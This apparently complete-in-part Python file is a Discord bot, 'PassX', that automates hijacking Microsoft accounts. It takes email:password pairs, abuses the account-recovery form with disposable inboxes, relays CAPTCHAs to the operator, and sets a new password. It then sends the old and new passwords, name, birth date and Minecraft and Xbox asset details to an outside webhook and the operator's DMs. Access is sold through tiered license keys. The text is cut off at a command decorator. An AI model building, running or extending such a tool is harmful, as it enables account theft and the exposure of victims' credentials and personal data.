"""
PASS CHANGER BOT — PassX Edition
PassX Premium Automation
"""

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
from datetime import datetime, timedelta
import random
import sys
from io import BytesIO
from PIL import Image
import threading
import traceback
from colorama import Fore, Style, init

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from automation.core import scrape_account_info
    from automation.acsr import submit_acsr_form
    from automation.acsr_continue import continue_acsr_flow
    from automation.reset_password import perform_password_reset
    from automation.captcha import download_captcha
    import tempmail
except ImportError as e:
    print(f"Warning: Could not import automation modules: {e}")
    print("Make sure automation/, gui/, utils/ folders are in the same directory")

from key_manager import (
    generate_key, redeem_key, get_user_license,
    has_valid_license, revoke_user_keys, list_all_keys,
    KEY_LABELS
)

# ═══════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════
ADMIN_ID              = 771258043517763585
CONFIG_FILE           = "bot_config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE  = "active_sessions.json"
STATS_FILE            = "bot_stats.json"

# Colors — vibrant, not faded
C_BRAND   = 0x5865F2   # blurple
C_SUCCESS = 0x2ECC71   # bright green
C_ERROR   = 0xFF0000   # red
C_WARN    = 0xFF8C00   # orange
C_INFO    = 0x00BFFF   # sky blue
C_GOLD    = 0xFFD700   # gold
C_PURPLE  = 0x9B59B6   # purple

FOOTER = "Pass Changer •  PassX Premium"
SEP    = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════════════════════════════════════
#  SIMPLE EMOJI SYSTEM — no custom emojis needed
# ═══════════════════════════════════════════════
def E_DIAMOND():  return "🔹"
def E_ONE():      return "1️⃣"
def E_TWO():      return "2️⃣"
def E_THREE():    return "3️⃣"
def E_ALERT():    return "⚠️"
def E_SETTINGS(): return "⚙️"
def E_BOOK():     return "📖"
def E_MAIL():     return "📧"
def E_UPDATES():  return "ℹ️"
def E_PIN():      return "📌"
def E_TICK():     return "✅"
def E_RECORD():   return "🔴"
def E_CROSS():    return "❌"

# ═══════════════════════════════════════════════
#  LIVE PROGRESS TRACKER
# ═══════════════════════════════════════════════
# Steps: name, icon emoji name, substeps list
STEPS = [
    ("Account Preparation",  "mail",     [
        "Establishing browser session",
        "Navigating to login portal",
        "Submitting credentials",
        "Scraping account metadata",
        "Extracting security tokens",
    ]),
    ("Submitting ACSR Form", "BOOK",     [
        "Generating disposable inbox",
        "Loading ACSR form",
        "Populating account fields",
        "Preparing submission",
    ]),
    ("CAPTCHA Handling",     "alert",    [
        "Detecting CAPTCHA type",
        "Extracting CAPTCHA image",
        "Waiting for user input",
    ]),
    ("Continue Recovery",    "settings", [
        "Submitting ACSR form",
        "Waiting for server response",
        "Processing recovery link",
        "Validating reset token",
    ]),
    ("Password Reset",       "pin",      [
        "Opening reset portal",
        "Writing new credentials",
        "Confirming change",
    ]),
]

# Step states
PENDING = "pending"
ACTIVE  = "active"
DONE    = "done"
FAILED  = "failed"
WAITING = "waiting"


def _render_progress(step_states, sub_states, email, started, note=""):
    """Build the live progress embed."""
    emoji_map = {
        "mail": E_MAIL(),
        "BOOK": E_BOOK(),
        "alert": E_ALERT(),
        "settings": E_SETTINGS(),
        "pin": E_PIN(),
    }
    lines = []
    for idx, ((name, icon, subs), state, ssubs) in enumerate(
        zip(STEPS, step_states, sub_states)
    ):
        icon_e = emoji_map.get(icon, "•")
        num    = idx + 1

        if state == DONE:
            lines.append(f"{E_TICK()} **Step {num} — {icon_e} {name}**")
        elif state == ACTIVE:
            lines.append(f"{E_RECORD()} **Step {num} — {icon_e} {name}**")
        elif state == FAILED:
            lines.append(f"{E_CROSS()} **Step {num} — {icon_e} {name}**")
        elif state == WAITING:
            lines.append(f"{E_ALERT()} **Step {num} — {icon_e} {name}**")
        else:
            lines.append(f"{E_DIAMOND()} Step {num} — {icon_e} {name}")

        if state in (ACTIVE, WAITING, FAILED):
            sub_names = STEPS[idx][2]
            for sub_name, sub_st in zip(sub_names, ssubs):
                if sub_st == DONE:
                    lines.append(f"　　{E_TICK()}  {sub_name}")
                elif sub_st == ACTIVE:
                    lines.append(f"　　{E_RECORD()}  **{sub_name}**")
                elif sub_st == FAILED:
                    lines.append(f"　　{E_CROSS()}  {sub_name}")
                else:
                    lines.append(f"　　{E_UPDATES()}  {sub_name}")

        lines.append("")

    elapsed    = int((datetime.now() - started).total_seconds())
    m, s       = divmod(elapsed, 60)
    time_str   = f"{m}m {s}s" if m else f"{s}s"

    if FAILED in step_states:
        color = C_ERROR
    elif all(x == DONE for x in step_states):
        color = C_SUCCESS
    elif ACTIVE in step_states or WAITING in step_states:
        color = C_BRAND
    else:
        color = 0x23272A

    desc = "\n".join(lines)
    if note:
        desc += f"\n{SEP}\n{note}"

    e = discord.Embed(
        title=f"{E_DIAMOND()}  PassX — Recovery Pipeline",
        description=desc,
        color=color,
        timestamp=datetime.now()
    )
    e.add_field(name=f"{E_MAIL()}  Target",   value=f"`{email}`", inline=True)
    e.add_field(name=f"{E_UPDATES()}  Elapsed", value=time_str,   inline=True)
    e.set_footer(text=FOOTER)
    return e


class Progress:
    """Holds and edits a single live progress message."""

    def __init__(self, email, channel, started):
        self.email   = email
        self.channel = channel
        self.started = started
        self.msg     = None
        n = len(STEPS)
        self.step_states = [PENDING] * n
        self.sub_states  = [[PENDING] * len(s[2]) for s in STEPS]

    async def send(self):
        self.msg = await self.channel.send(
            embed=_render_progress(self.step_states, self.sub_states, self.email, self.started)
        )

    async def _edit(self, note=""):
        if self.msg:
            try:
                await self.msg.edit(embed=_render_progress(
                    self.step_states, self.sub_states, self.email, self.started, note
                ))
            except Exception:
                pass

    async def step_start(self, i, note=""):
        self.step_states[i] = ACTIVE
        self.sub_states[i]  = [PENDING] * len(STEPS[i][2])
        await self._edit(note)

    async def sub_start(self, i, j):
        self.sub_states[i][j] = ACTIVE
        await self._edit()

    async def sub_done(self, i, j):
        self.sub_states[i][j] = DONE
        await self._edit()

    async def step_done(self, i, note=""):
        self.step_states[i] = DONE
        self.sub_states[i]  = [DONE] * len(STEPS[i][2])
        await self._edit(note)

    async def step_fail(self, i, note=""):
        self.step_states[i] = FAILED
        await self._edit(note)

    async def step_wait(self, i, note=""):
        self.step_states[i] = WAITING
        await self._edit(note)


# ═══════════════════════════════════════════════
#  DATA MANAGER  (identical logic, same as original)
# ═══════════════════════════════════════════════
class BotDataManager:
    def __init__(self):
        # Load config — env var WEBHOOK_URL overrides saved file (fixes GitHub Actions reset)
        default_webhook = os.environ.get("WEBHOOK_URL", "")
        self.config = self.load_json(CONFIG_FILE, {
            "webhook_url": default_webhook, "bot_enabled": True, "max_concurrent_users": 10
        })
        # If file exists but webhook is empty, fill from env
        if not self.config.get("webhook_url") and default_webhook:
            self.config["webhook_url"] = default_webhook
        self.authorized_users = self.load_json(AUTHORIZED_USERS_FILE, {
            str(ADMIN_ID): {"authorized": True, "added_by": "system", "added_at": str(datetime.now())}
        })
        self.active_sessions     = {}
        self.otp_data            = {}
        self.processing_sessions = {}
        self.stats = self.load_json(STATS_FILE, {
            "total_processed": 0, "total_success": 0,
            "total_failed": 0, "users_served": {}
        })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

    def _git_commit(self, filename):
        """Auto-save — git push disabled."""
        pass

    def save_config(self):           self.save_json(CONFIG_FILE, self.config)
    def save_authorized_users(self):  self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)
    def save_stats(self):            self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and \
               self.authorized_users[str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin):
        self.authorized_users[str(user_id)] = {
            "authorized": True, "added_by": str(by_admin), "added_at": str(datetime.now())
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        self.authorized_users.pop(str(user_id), None)
        self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp, "expires": datetime.now() + timedelta(minutes=5), "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."
        data = self.otp_data[user_id]
        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."
        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."
        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {"authenticated": True, "auth_time": datetime.now()}
            return True, "Authentication successful!"
        data["attempts"] += 1
        return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False
        auth_time = self.active_sessions[user_id].get("auth_time")
        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False
        return True

    def logout(self, user_id):
        self.active_sessions.pop(user_id, None)

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1
        u = str(user_id)
        self.stats["users_served"].setdefault(u, {"processed": 0, "success": 0})
        self.stats["users_served"][u]["processed"] += 1
        if success:
            self.stats["users_served"][u]["success"] += 1
        self.save_stats()


# ═══════════════════════════════════════════════
#  BOT SETUP
# ═══════════════════════════════════════════════
def generate_elite_password():
    return "PassX" + ''.join([str(random.randint(0, 9)) for _ in range(6)])

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot          = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# ═══════════════════════════════════════════════
#  EMBED HELPERS
# ═══════════════════════════════════════════════
def mk(title, desc, color, fields=None):
    e = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now())
    if fields:
        for f in fields:
            e.add_field(name=f["name"], value=f["value"], inline=f.get("inline", False))
    e.set_footer(text=FOOTER)
    return e

def ok(t, d, f=None):    return mk(f"{E_TICK()}  {t}",    d, C_SUCCESS, f)
def err(t, d, f=None):   return mk(f"{E_CROSS()}  {t}",   d, C_ERROR,   f)
def info(t, d, f=None):  return mk(f"{E_UPDATES()}  {t}", d, C_INFO,    f)
def warn(t, d, f=None):  return mk(f"{E_ALERT()}  {t}",   d, C_WARN,    f)
def brand(t, d, f=None): return mk(f"{E_DIAMOND()}  {t}", d, C_BRAND,   f)
def adm(t, d, f=None):   return mk(f"{E_SETTINGS()}  {t}",d, C_GOLD,    f)


# ═══════════════════════════════════════════════
#  WEBHOOK
# ═══════════════════════════════════════════════
async def send_to_webhook(result):
    url = data_manager.config.get("webhook_url")
    if not url:
        return
    payload = {
        "embeds": [{
            "title": f"{E_TICK()}  Account Successfully Processed",
            "color": C_SUCCESS,
            "fields": [
                {"name": f"{E_MAIL()}  Email",        "value": f"`{result['email']}`",                    "inline": False},
                {"name": "🔓  Old Password",           "value": f"||`{result['old_password']}`||",          "inline": True},
                {"name": "🔒  New Password",           "value": f"`{result['new_password']}`",              "inline": True},
                {"name": "👤  Name",                   "value": result.get("name", "—"),                   "inline": True},
                {"name": "🎂  DOB",                    "value": result.get("dob", "—"),                    "inline": True},
                {"name": "🌍  Region",                 "value": result.get("region", "—"),                 "inline": True},
                {"name": "💬  Skype ID",               "value": result.get("skype_id", "—"),               "inline": True},
                {"name": "📧  Skype Email",            "value": result.get("skype_email", "—"),            "inline": True},
                {"name": "🎮  Gamertag",               "value": result.get("gamertag", "—"),               "inline": True},
                {"name": "⬛  ━━━━━━ MINECRAFT ━━━━━━", "value": "​",                                     "inline": False},
                {"name": "⛏️  Java Edition",           "value": result.get("mc_java",     "⚠️ Skipped"),  "inline": True},
                {"name": "📱  Bedrock Edition",        "value": result.get("mc_bedrock",  "⚠️ Skipped"),  "inline": True},
                {"name": "🧑  MC Username",            "value": f"`{result.get('mc_username','—')}`",      "inline": True},
                {"name": "⬛  ━━━━━━ XBOX ━━━━━━",     "value": "​",                                     "inline": False},
                {"name": "🎮  Game Pass",              "value": result.get("xbox_gp",     "⚠️ Skipped"),  "inline": True},
                {"name": "👑  Game Pass Ultimate",     "value": result.get("xbox_gpu",    "⚠️ Skipped"),  "inline": True},
                {"name": "💻  PC Game Pass",           "value": result.get("xbox_pc_gp",  "⚠️ Skipped"),  "inline": True},
                {"name": "⬛  ━━━━━━ BAN STATUS ━━━━━━","value": "​",                                    "inline": False},
                {"name": "🔨  Hypixel",                "value": result.get("hypixel_ban", "⚠️ Skipped"),  "inline": True},
                {"name": "🍩  Donut SMP",              "value": result.get("donut_ban",   "⚠️ Skipped"),  "inline": True},
            ],
            "footer": {"text": f"Operator: {result.get('user_id', '?')}  •  {FOOTER}"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload)
    except Exception as ex:
        print(f"Webhook error: {ex}")


# ═══════════════════════════════════════════════
#  CORE PROCESSING  (same logic as original, new UI)
# ═══════════════════════════════════════════════
async def process_account_full(email, password, user_id, channel):
    loop    = asyncio.get_event_loop()
    started = datetime.now()
    prog    = Progress(email, channel, started)
    await prog.send()

    try:
        # ── Step 1: Scrape account info ──────────────
        await prog.step_start(0)
        await prog.sub_start(0, 0)

        account_info = await loop.run_in_executor(None, scrape_account_info, email, password)

        for j in range(len(STEPS[0][2])):
            await prog.sub_done(0, j)

        if not account_info or account_info.get("error"):
            msg = (account_info or {}).get("error", "Could not login")
            await prog.step_fail(0, f"{E_CROSS()}  **{msg}**")
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": msg}

        await prog.step_done(0)

        # ── Step 2: Submit ACSR form ─────────────────
        await prog.step_start(1)
        for j in range(len(STEPS[1][2])):
            await prog.sub_start(1, j)

        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info
        )

        if not captcha_image or not driver:
            await prog.step_fail(1, f"{E_CROSS()}  ACSR form submission failed.")
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}

        for j in range(len(STEPS[1][2])):
            await prog.sub_done(1, j)
        await prog.step_done(1)

        # ── Step 3: CAPTCHA ──────────────────────────
        captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        data_manager.processing_sessions[user_id] = {
            "driver":           driver,
            "token":            token,
            "temp_email":       temp_email,
            "account_info":     account_info,
            "email":            email,
            "password":         password,
            "captcha_file":     captcha_filename,
            "captcha_attempts": 0,
            "channel_id":       channel.id,
            "start_time":       started,
            "progress":         prog,
        }

        await prog.step_start(2)
        await prog.sub_done(2, 0)
        await prog.sub_done(2, 1)
        await prog.step_wait(
            2,
            f"{E_ALERT()}  **CAPTCHA required** — solve the image below.\n"
            f"Use `/submit_captcha <your answer>` to continue."
        )

        await channel.send(
            embed=warn(
                "CAPTCHA Required",
                f"{E_ALERT()}  Type what you see in the image:\n"
                f"`/submit_captcha <answer>`\n\n"
                f"⏱ **5 minutes** to respond  •  **3** attempts allowed"
            ),
            file=discord.File(captcha_filename)
        )

        return {"status": "captcha_pending"}

    except Exception as e:
        traceback.print_exc()
        await channel.send(embed=err("Processing Error", f"```{e}```"))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}


async def continue_after_captcha(user_id, captcha_text, interaction):
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=warn("No Session", "No active CAPTCHA session found."), ephemeral=True
        )
        return

    session      = data_manager.processing_sessions[user_id]
    driver       = session["driver"]
    token        = session["token"]
    account_info = session["account_info"]
    email        = session["email"]
    password     = session["password"]
    channel      = bot.get_channel(session["channel_id"])
    prog: Progress = session["progress"]

    try:
        await interaction.response.defer(ephemeral=True)

        # Close CAPTCHA step
        await prog.sub_done(2, 2)
        await prog.step_done(2)

        # ── Step 4: Continue ACSR ────────────────────
        await prog.step_start(3)
        for j in range(len(STEPS[3][2])):
            await prog.sub_start(3, j)

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(
            None, continue_acsr_flow, driver, account_info, token, captcha_text, user_id
        )

        # CAPTCHA wrong
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1
            left = 3 - session["captcha_attempts"]

            if session["captcha_attempts"] >= 3:
                await prog.step_fail(3, f"{E_CROSS()}  All CAPTCHA attempts exhausted.")
                await channel.send(embed=err(
                    "CAPTCHA Limit Reached",
                    f"{E_CROSS()}  All 3 attempts used. Start over with `/process`."
                ))
                await interaction.followup.send(
                    embed=err("Failed", "Max CAPTCHA attempts reached."), ephemeral=True
                )
                _cleanup(user_id, driver, session)
                data_manager.update_stats(user_id, False)
                return

            new_captcha = await loop.run_in_executor(None, download_captcha, driver)
            new_fname   = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_fname, "wb") as f:
                f.write(new_captcha.read())
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_fname

            # Reset progress display for retry
            prog.step_states[2] = WAITING
            prog.sub_states[2]  = [DONE, DONE, WAITING]
            prog.step_states[3] = PENDING
            prog.sub_states[3]  = [PENDING] * len(STEPS[3][2])
            await prog._edit(
                f"{E_ALERT()}  **Wrong CAPTCHA** — {left} attempt{'s' if left != 1 else ''} remaining.\n"
                f"Solve the new image and use `/submit_captcha <text>`."
            )

            await channel.send(
                embed=warn("Wrong CAPTCHA",
                           f"{E_ALERT()}  {left} attempt{'s' if left != 1 else ''} remaining:"),
                file=discord.File(new_fname)
            )
            await interaction.followup.send(
                embed=warn("Try Again", f"{E_ALERT()}  Check the channel for the new CAPTCHA."),
                ephemeral=True
            )
            return

        # ACSR error
        if not reset_link or str(reset_link).startswith("ERROR"):
            await prog.step_fail(3, f"{E_CROSS()}  Recovery flow failed: {reset_link}")
            await channel.send(embed=err("Recovery Failed", f"`{reset_link}`"))
            await interaction.followup.send(
                embed=err("Failed", str(reset_link)), ephemeral=True
            )
            _cleanup(user_id, driver, session)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[3][2])):
            await prog.sub_done(3, j)
        await prog.step_done(3)

        # ── Step 5: Reset password ───────────────────
        await prog.step_start(4)
        for j in range(len(STEPS[4][2])):
            await prog.sub_start(4, j)

        new_password    = generate_elite_password()
        actual_password = await loop.run_in_executor(
            None, perform_password_reset, reset_link, email, new_password
        )

        if not actual_password:
            await prog.step_fail(4, f"{E_CROSS()}  Password write failed.")
            await channel.send(embed=err("Reset Failed", "Could not change the password."))
            await interaction.followup.send(
                embed=err("Failed", "Password reset failed."), ephemeral=True
            )
            _cleanup(user_id, driver, session)
            data_manager.update_stats(user_id, False)
            return

        for j in range(len(STEPS[4][2])):
            await prog.sub_done(4, j)

        elapsed  = int((datetime.now() - session["start_time"]).total_seconds())
        m, s     = divmod(elapsed, 60)
        time_str = f"{m}m {s}s" if m else f"{s}s"

        await prog.step_done(4, f"{E_TICK()}  **Pipeline complete** in **{time_str}**")

        # Build result and dispatch
        result = {
            "email":        email,
            "old_password": password,
            "new_password": actual_password,
            "name":         account_info.get("name"),
            "dob":          account_info.get("dob"),
            "region":       account_info.get("region"),
            "skype_id":     account_info.get("skype_id"),
            "skype_email":  account_info.get("skype_email"),
            "gamertag":     account_info.get("gamertag"),
            "user_id":      user_id,
            "mc_java":      account_info.get("mc_java",     "⚠️ Skipped"),
            "mc_bedrock":   account_info.get("mc_bedrock",  "⚠️ Skipped"),
            "mc_username":  account_info.get("mc_username", "—"),
            "xbox_gp":      account_info.get("xbox_gp",     "⚠️ Skipped"),
            "xbox_gpu":     account_info.get("xbox_gpu",    "⚠️ Skipped"),
            "xbox_pc_gp":   account_info.get("xbox_pc_gp",  "⚠️ Skipped"),
            "hypixel_ban":  account_info.get("hypixel_ban", "⚠️ Skipped"),
            "donut_ban":    account_info.get("donut_ban",   "⚠️ Skipped"),
        }
        await send_to_webhook(result)
        data_manager.update_stats(user_id, True)

        # ── DM the user ──────────────────────────────
        try:
            user_obj = bot.get_user(user_id) or await bot.fetch_user(user_id)
            dm = discord.Embed(
                title=f"{E_TICK()}  Account Successfully Processed",
                color=C_SUCCESS, timestamp=datetime.now()
            )
            dm.add_field(name="📧  Email",          value=f"`{email}`",             inline=False)
            dm.add_field(name="🔓  Old Password",   value=f"||`{password}`||",      inline=True)
            dm.add_field(name="🔒  New Password",   value=f"`{actual_password}`",   inline=True)
            dm.add_field(name="⏱️  Time",           value=time_str,                 inline=True)
            dm.add_field(name="⬛  ━━ MINECRAFT ━━", value="​",                    inline=False)
            dm.add_field(name="⛏️  Java",           value=result.get("mc_java",    "⚠️ Skipped"), inline=True)
            dm.add_field(name="📱  Bedrock",        value=result.get("mc_bedrock", "⚠️ Skipped"), inline=True)
            dm.add_field(name="🧑  MC Username",    value=f"`{result.get('mc_username','—')}`",   inline=True)
            dm.add_field(name="⬛  ━━ XBOX ━━",     value="​",                    inline=False)
            dm.add_field(name="🎮  Game Pass",      value=result.get("xbox_gp",    "⚠️ Skipped"), inline=True)
            dm.add_field(name="👑  GPU",            value=result.get("xbox_gpu",   "⚠️ Skipped"), inline=True)
            dm.add_field(name="💻  PC GP",          value=result.get("xbox_pc_gp", "⚠️ Skipped"), inline=True)
            dm.add_field(name="⬛  ━━ BAN STATUS ━━", value="​",                  inline=False)
            dm.add_field(name="🔨  Hypixel",        value=result.get("hypixel_ban","⚠️ Skipped"), inline=True)
            dm.add_field(name="🍩  Donut SMP",      value=result.get("donut_ban",  "⚠️ Skipped"), inline=True)
            dm.set_footer(text=FOOTER)
            await user_obj.send(embed=dm)
        except Exception as dm_err:
            print(f"⚠️ Could not DM user {user_id}: {dm_err}")

        await channel.send(embed=ok(
            "Account Processed",
            f"{E_TICK()}  Password rotated for `{email}`\n{SEP}",
            [
                {"name": "🔓  Old Password",       "value": f"||`{password}`||",    "inline": True},
                {"name": "🔒  New Password",       "value": f"`{actual_password}`", "inline": True},
                {"name": f"{E_UPDATES()}  Time",   "value": time_str,               "inline": True},
                {"name": "📊  Full Report",        "value": "Sent to webhook + DM.", "inline": False},
            ]
        ))

        await interaction.followup.send(
            embed=ok("Done!", f"{E_TICK()}  **New password:** `{actual_password}`\nFull report sent to your DMs."),
            ephemeral=True
        )

    except Exception as e:
        traceback.print_exc()
        await channel.send(embed=err("Error", f"```{e}```"))
        await interaction.followup.send(embed=err("Error", str(e)), ephemeral=True)
        data_manager.update_stats(user_id, False)
    finally:
        _cleanup(user_id, driver, session)


def _cleanup(user_id, driver, session):
    try:
        driver.quit()
    except Exception:
        pass
    cf = session.get("captcha_file", "")
    if cf and os.path.exists(cf):
        try:
            os.remove(cf)
        except Exception:
            pass
    data_manager.processing_sessions.pop(user_id, None)


# ═══════════════════════════════════════════════
#  ACCESS CHECKS
# ═══════════════════════════════════════════════
def check_auth():
    async def predicate(i: discord.Interaction) -> bool:
        uid = i.user.id
        if uid == ADMIN_ID:
            return True
        if not data_manager.is_authorized(uid):
            await i.response.send_message(
                embed=err("Not Authorized",
                          f"{E_CROSS()}  Contact admin <@{ADMIN_ID}> or use `/redeem <key>`."),
                ephemeral=True
            )
            return False
        # Check license validity
        if not has_valid_license(uid):
            await i.response.send_message(
                embed=err("License Expired",
                          f"{E_CROSS()}  Your license has expired.\n"
                          f"Use `/redeem <key>` to activate a new one."),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)

def check_login():
    async def predicate(i: discord.Interaction) -> bool:
        if not data_manager.is_authenticated(i.user.id):
            await i.response.send_message(
                embed=err("Not Logged In",
                          f"{E_CROSS()}  Use `/request_otp` then `/verify_otp` first."),
                ephemeral=True
            )
            return False
        return True
    return app_commands.check(predicate)


# ═══════════════════════════════════════════════
#  EVENTS
# ═══════════════════════════════════════════════
@bot.event
async def on_ready():
    init(autoreset=True)  # Initialize colorama for Windows
    print("")
    print(Fore.RED + Style.BRIGHT + """
    ██████╗  █████╗ ███████╗███████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝
    ██████╔╝███████║███████╗███████╗ ╚███╔╝ 
    ██╔═══╝ ██╔══██║╚════██║╚════██║ ██╔██╗ 
    ██║     ██║  ██║███████║███████║██╔╝ ██╗
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.YELLOW + Style.BRIGHT + "              B Y   F I N A L X G A M E R S,C O M P E L L I N G D R A G O N,C O D E X F O X")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print("")
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"Name:     " + Fore.CYAN + f"{bot.user.name}")
    print(Fore.GREEN + Style.BRIGHT + f"  [BOT]     " + Fore.WHITE + f"ID:       " + Fore.CYAN + f"{bot.user.id}")
    print(Fore.GREEN + Style.BRIGHT + f"  [ADMIN]   " + Fore.WHITE + f"ID:       " + Fore.YELLOW + f"{ADMIN_ID}")
    print(Fore.GREEN + Style.BRIGHT + f"  [USERS]   " + Fore.WHITE + f"Authorized: " + Fore.CYAN + f"{len(data_manager.authorized_users)}")
    print(Fore.GREEN + Style.BRIGHT + f"  [EMOJIS]  " + Fore.WHITE + f"Type:     " + Fore.CYAN + "Unicode (13/13)")
    print(Fore.GREEN + Style.BRIGHT + f"  [COMMANDS]" + Fore.WHITE + f"Synced:   " + Fore.CYAN + f"19 slash commands")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print("")

    try:
        synced = await bot.tree.sync()
        print(Fore.GREEN + Style.BRIGHT + f"  ✓ Synced {len(synced)} slash commands successfully.\n")
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"  ✗ Sync error: {e}\n")

    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="PassX Made By FinalXGamers,Compelling Dragon and Codex FOX  |  /help"
    ))

# ═══════════════════════════════════════════════
#  COMMANDS — USER
# ═══════════════════════════════════════════════
@bot.tree.command(name="help", description="View all commands")
async def help_command(i: discord.Interaction):
    if not data_manager.is_authorized(i.user.id):
        await i.response.send_message(
            embed=err("Not Authorized", f"{E_CROSS()}  Contact <@{ADMIN_ID}> to request access."),
            ephemeral=True
        )
        return

    e = discord.Embed(
        title=f"{E_DIAMOND()}  PassX Recovery — Commands",
        description=(
            f"> {E_UPDATES()}  Automated Microsoft account recovery.\n"
            f"> {E_PIN()}  Made By FinalXGamers, Compelling Dragon, Codex Fox.\n\n{SEP}"
        ),
        color=C_BRAND,
        timestamp=datetime.now()
    )
    e.add_field(
        name=f"{E_BOOK()}  Authentication",
        value=(
            f"`/request_otp` — Get login code via DM\n"
            f"`/verify_otp <code>` — Activate session\n"
            f"`/logout` — End session"
        ), inline=False
    )
    e.add_field(
        name=f"{E_SETTINGS()}  Recovery Pipeline",
        value=(
            f"`/process <email:pass>` — Launch pipeline\n"
            f"`/submit_captcha <text>` — Submit CAPTCHA\n"
            f"`/status` — Check session state\n"
            f"`/cancel` — Abort active process"
        ), inline=False
    )
    e.add_field(
        name=f"{E_DIAMOND()}  License",
        value=(
            f"`/redeem <key>` — Activate a license key\n"
            f"`/mylicense` — Check your license status"
        ), inline=False
    )
    if i.user.id == ADMIN_ID:
        e.add_field(
            name=f"{E_ALERT()}  Administration",
            value=(
                f"`/admin` — Control panel\n"
                f"`/authorize @user` — Grant access\n"
                f"`/revoke @user` — Remove access\n"
                f"`/list_users` — View access list\n"
                f"`/set_webhook <url>` — Set results channel\n"
                f"`/stats` — Performance metrics"
            ), inline=False
        )
        e.add_field(
            name=f"{E_SETTINGS()}  Key Management",
            value=(
                f"`/genkey <plan>` — Generate 1day/7day/30day/lifetime key\n"
                f"`/listkeys` — View all keys + status\n"
                f"`/revokekey @user` — Expire user's keys"
            ), inline=False
        )
    e.add_field(
        name=f"{E_PIN()}  Quick Start",
        value=(
            f"{E_ONE()}  `/request_otp` → check DMs\n"
            f"{E_TWO()}  `/verify_otp <code>` → login\n"
            f"{E_THREE()}  `/process email:password` → start\n"
            f"{E_ALERT()}  Solve CAPTCHA image in chat\n"
            f"{E_TICK()}  `/submit_captcha <answer>` → done"
        ), inline=False
    )
    e.set_footer(text=FOOTER)
    await i.response.send_message(embed=e, ephemeral=True)


@bot.tree.command(name="request_otp", description="Get a one-time login code via DM")
@check_auth()
async def request_otp(i: discord.Interaction):
    uid = i.user.id
    if data_manager.is_authenticated(uid):
        await i.response.send_message(
            embed=info("Already Logged In", f"{E_TICK()}  Your session is active. Use `/logout` to reset."),
            ephemeral=True
        )
        return

    otp = data_manager.generate_otp(uid)
    try:
        dm_embed = discord.Embed(
            title=f"{E_BOOK()}  Your PassX Access Code",
            description=(
                f"## `  {otp}  `\n\n"
                f"{E_UPDATES()}  Use in server:\n`/verify_otp {otp}`\n\n"
                f"> ⏱ Valid **5 minutes**\n"
                f"> {E_ALERT()}  Do **not** share this code"
            ),
            color=C_PURPLE,
            timestamp=datetime.now()
        )
        dm_embed.set_footer(text=FOOTER)
        await i.user.send(embed=dm_embed)
        await i.response.send_message(
            embed=ok("Code Sent", f"{E_TICK()}  Check your Direct Messages."),
            ephemeral=True
        )
    except discord.Forbidden:
        await i.response.send_message(
            embed=err("DMs Blocked", f"{E_CROSS()}  Enable DMs from server members in Privacy Settings."),
            ephemeral=True
        )


@bot.tree.command(name="verify_otp", description="Verify OTP to start a session")
